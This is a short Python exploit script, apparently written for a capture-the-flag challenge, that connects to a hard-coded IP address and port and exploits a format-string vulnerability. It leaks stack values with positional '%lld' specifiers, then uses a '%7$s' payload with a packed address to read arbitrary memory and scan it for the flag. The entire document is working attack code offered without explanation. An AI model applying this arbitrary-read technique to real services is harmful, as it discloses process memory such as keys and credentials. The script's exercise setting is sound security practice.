#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

s=newconn()
a14=leak_lld(s,14)
a1=leak_lld(s,1)
print("arg14=",hex(a14),"arg1=",hex(a1&((1<<64)-1)))
# try scanning from arg14 upward for flag
found=[]
cur=a14
for i in range(3000):
    r=readmem(s,cur)
    if b'PTITCTF' in r or b'{' in r:
        print("MARK",hex(cur),repr(r[:300])); found.append((cur,r))
        if b'}' in r:
            # likely the full flag
            import re as _re
            mm=_re.search(rb'[A-Za-z0-9_]+\{[^}]*\}', r)
            if mm: print("FLAG?", mm.group(0))
    if r==b'<T' or r==b'':
        try: s.close()
        except: pass
        s=newconn(); a14=leak_lld(s,14)
        cur=a14
        cur+=1
    else:
        strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
        adv=max(len(strb),1)
        cur+=adv
    if cur-a14>0x30000: break
    if i%500==0: print(" ...",hex(cur))
print("done",len(found))
s.close()
